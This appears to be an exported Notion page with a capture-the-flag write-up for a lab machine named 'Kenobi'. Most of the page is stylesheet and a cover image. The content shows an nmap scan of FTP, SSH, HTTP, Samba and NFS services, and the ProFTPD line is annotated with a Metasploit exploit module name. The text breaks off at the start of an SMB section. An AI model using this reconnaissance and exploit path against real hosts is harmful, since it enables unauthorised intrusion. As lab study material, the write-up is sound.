@@ -1,0 +1,777 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>22 Kenobi :</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="193398f2-9c4e-8078-b39d-e4c67d80a5e3" class="page sans"><header><img class="page-cover-image" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhUTEhMVFRUVFRUVFRUVFRUVFRUVFRUXFxUXFRUYHSggGBolHRUVITEhJSkrLi4uFx8zODMtNygtLisBCgoKDQ0NFQ8PFS0ZFRkrKystKysrLS0tLSstKysrLS0tKystLS03LS03Ny03Ny0tLTctNystKystKysrKy0rLf/AABEIALIBGwMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAADBAABAgUGB//EAC8QAAMBAAECBAQGAgIDAAAAAAABAgMRBCESEzFBBVFhcRQigZGh8LHRweEjUnL/xAAYAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/EABkRAQEBAQEBAAAAAAAAAAAAAAARAUEhAv/aAAwDAQACEQMRAD8AemuOBiPQUa9BvF9j2Y4C0wkT2KSCSBmJa7h+exTkFLKjXIWPQzkg1wQY45fYiruExj3KvIo34yn6mc2WkBrNBOCswkyWAOs9jEsYsE5EA2jNUXQG2QaXc3bAToX4wNMxTCqTFwADxf39SvGbc9jCX7kGHZGyIrQCJFpP3/gpEVBQeofdL+QKj1Xb78f3n/sZpgWQB0F9KCb0K3+xNBFQOqBzoZu+xBt0Z8QLxmfEFdzOe43mL8B4ZtDEsImARbsocTByv8g/EbyCCyF554M5o3M+gBZZVJGnHcjkoB4TSZtSWpAuF7hEZUlpAU/UE/UM5MqQAVIj1NHWrLscTrUTQLzDL3AOzLIrsdJryg9SJ/DDqeAqEuOAfsN3AvcgLuSmgjRTADQNMJowLZBmqBaWatgNGRQ9WL0zetC9UZFN8AdKJVi+mhFX5hPGL1qV5pKPZcdwq7GJRpnVBEywaojoIYk3mByYePoUOYoLS9AeTCt+hQSS+Cm+CpoCe5ZlvuX4u3IG0zSRjN8hVIRJnua8BuZNqSqE47HF6/Dueg8Ah8Qz7EHltYLzzOnp8OajzG54b9E1z+xrp/h6ebt3K4faW+7+yMxU+HY+50wfw7L8qYbVGkA0QDSQ9A9ApO0DYfRAqRELaoWsb1QpqQCqgGjCWxerM6AaCl2N6sR2MtBPUBbJYJ0RFMxyaYJsivoUlszJbZ2ZU2VTI6RXi9CBjHsMwxJWGzso6eQb5CvT2M+I0CMxTNgdQM7V2I7/ACcmLrlA3f5OPfkBzO+M+foxrpV+VfY5l3+SZ+bOxkuEl9AjakJMmZQdBWZkX67LmWPIxrPYGvEdXTT4M9LTbSGfjU8UD+ELmidHpuly4lFaSMpdgGhQlcgrQ1ohe2ApSAbVwmxu0K9TPMsgT6mvyt/QSV/l5+gZ3zD+iaEZv/xv9TIrzOVyL6WamvyCvi5MriXoLahaYBsgW0F7sZ0YtqkZUPxv2B+cYuuDHiIr6SrKdgmzJ2ZFpg3ZTbBVff8AQIaihnKjnqxnKwOpjYyrOXlY3np6fc0OimRg1RpUUKbdmwNMZ6j1FdCC8b7r7noHokuX6HmUNxpWjU8/6+4He6bXxLn0+Q1LE8EkkvkG8aKGpZWr7C/4hIT6v4guAON8bSbYP4QuGgXWbcsnS6cMnTj1qvsCtiGHWhn1CA1oLUzd6oXuwMWxfWgWu7l9/T2A69TPHPJBzN9/C6Xz5Ode3bg11W3LYo6Mbqjaa/lSX6mGYj1K0ogzVC90TTQX00ILuxfSzOmgtV8mVTSwPBWrMeMNY+l8maZh2Yeh1YW9QWmncxdgfMIG4sYzsRy5HcuPcuJp/Focz9jm52OY6msHRhm0xaLCqjQrfuL0GugDZBeWTb7HRxlQvr7sVxvhEvUBx9UBvq2KtgqbKDbda/mJbdQ2VogFIzuqHdlLYlyBpEDk9Ub/ABrOa2RMlI60dewq6vk4vJfmstR1ddU+zOL1qa+3zC/iDGmnPqTRydLM8m+qzSfYA6MKJNA9bMeMHdgYuhe2buhXWyKzoxfRBKYpW3zIoelg/M+pe1gvGiNPpT2M+MXdFqjoxBKXuCle5rSu38GKoBnJh41EJ0CxRUdOKGsaOXkxrK/qXNR1osKrOL1nxFZpNrnl8DXR9YrlUvf2+zNUP1QNswrI2AWaDxIvkw6ooIoJ5ZSot2AvvkJaIf0sR2ZNC9i9BtKFrZlVM1lmZTD5UMN1bzAWg2morpqNTAtQFahLsS2syqt9RaqM3YKrJQR0Buwd6Ct7EUa9AFMw7MXZFY114F9NE+5vbuhHRkaW2WqA+I0n/eSK975ppaHMnc09zdc3Qe3f7G4fuzmZ6e4edC0dKbQWBDKkMxqUroTRW3UKZbfolyKeacz471XEcf8As/4Xf/QqMfEvinmNcdkv3Ol8D+KTws32ffh+z5fJ456DPSb8NP5NP9jOfXqx9JjQKqOVhv2Gp2OtZPzYRaCM6m1qUPKyq1E/NMPUUM3oLaWDvYDepKJpQvVF3oBqzK434jT1FXqDeoDGmwvWoDXYXvYlB9NhXXQHeotrsSqmugJ6gdNAN6mVguuonpsD01AVZKsHexl7i1WZ8ZFNeZyB2BeIp2BRFRXJaYV3lqa84560Za1KzHTnqA+exxZ0GcdC1I7eeoeNTkZ7BVsWpHUfUHK+La8uF9/+Db2FuolVw37DdMc12HwYm2PfD8/En+n9/wAGca167od/yT/8r/CHZ2OLhfCS+QzOx0zWHWnY355zFsa84tHR88rzjn+cTzhQ5ewGthetgN7ChmtgN7Cl7C+vUmaHK3A31Bz76gFWxKsP11AHTYQvcFe5KsOXsL6aC34kFpsSrBr2FtNDDvkDdkVqrA1ZKoFTA14inQJ0RMK34jXiB8+5PEQETNpg47hVAUdaGvEDaKZWRpYWbFZthpoBmdg87CSZtUVDi2KqxdWR6gA8PqO/Dq4XP1EHfqOdPfCQNdWNg07nOjUJ531LWY6C6g1+IOWtyXsWkdT8SRdSclaov8R8hSOnXUA66k5t6sx5xKsOa9Qxa9QFa/MBegWHHYDXYUrYG9yUg70B3oAexHpyRVvQy9DLoHVgbehmrBNkCtVQN0VVA2yER0EVgTUkURPublt9/wCDMTyEUfN/sBIv59hpApzCoo2TwmoRvwmkYUmvCTg1z9ABrsbmicGQjbsrxGUzSQGFIaGyokIgCKzUMDyWq4AO74F72fzLqgFsCOy87BUazz+ZAfn+9yOzC+5aRRitQVachagBaIB0wdUW32BUwraovkHKLYF+IBencL4TLjuQTlGkyeD5kbXyAHpPJnwdg3Bmq49EFA4N8GlHcLMkguF/JtIhuJKLlGycEKCoZXoUQqKozBCAXQGiEAyguZCAERbIQIkPsD9yEAi9zDKIBlBM/chCKNC9DbRCFQOl6i1+pCBQWBf+yEIqFUQgE4KXuQgFV6GY9CEA0Zn/AJIQg1JuPUhADJGpKIUaKIQD/9k=" style="object-position:center 19.889999999999997%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">💀</span></div><h1 class="page-title" dir="auto">22 Kenobi :</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><p id="193398f2-9c4e-80f7-b11f-dedefcc77e8b" class="">
+</p></div><div style="display:contents" dir="auto"><ul id="193398f2-9c4e-802f-bc40-dddd5536b7c7" class="toggle"><li><details open=""><summary>Scan:</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-80d6-a030-d8c854e9cbc0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5   ---&gt;use exploit/unix/ftp/proftpd_modcopy_exec
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&#x27;t have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      42299/tcp6  mountd
+|   100005  1,2,3      47999/udp   mountd
+|   100005  1,2,3      48231/tcp   mountd
+|   100005  1,2,3      52541/udp6  mountd
+|   100021  1,3,4      37457/tcp   nlockmgr
+|   100021  1,3,4      40015/tcp6  nlockmgr
+|   100021  1,3,4      49435/udp6  nlockmgr
+|   100021  1,3,4      51056/udp   nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs         2-4 (RPC #100003)</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="193398f2-9c4e-8031-94a6-cd87c5ea1148" class="toggle"><li><details open=""><summary>http:</summary><div style="display:contents" dir="ltr"><figure id="194398f2-9c4e-8021-bf75-e6b6375cfa9c" class="image"><a href="22%20Kenobi/image.png"><img style="width:555px" src="22%20Kenobi/image.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="193398f2-9c4e-8088-bacc-d07b21b9b3ac" class="">I don’t fine any information hear.</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="193398f2-9c4e-807a-9302-cd8d2b199a01" class="toggle"><li><details open=""><summary>smb:</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="193398f2-9c4e-8025-923c-e77fb106cf71" class="code code-wrap"><code class="language-JavaScript" 